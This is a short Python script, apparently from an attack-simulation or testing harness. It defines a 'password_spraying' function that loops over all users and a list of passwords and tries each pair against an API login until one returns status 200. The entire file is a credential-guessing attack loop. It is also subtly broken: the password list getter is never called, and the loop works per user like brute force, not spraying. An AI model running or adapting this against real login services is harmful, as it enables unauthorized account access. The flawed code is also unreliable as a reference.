from context import ctx
from client import ApiClientService

def password_spraying():
    """
    password_spraying attack
    :return:
    """
    users = ctx.user_handler.get_all_users()
    passwords = ctx.file_manager.get_password_spraying_passwords
    client_service = ApiClientService(seed_group=ctx.settings.seed_group)
    for user in users:
        for password in passwords:
            results = client_service.login(username=user.username, password=password)
            # if login successful then go to the next user
            if results["status_code"] == 200:
                break



if __name__ == '__main__':
    password_spraying()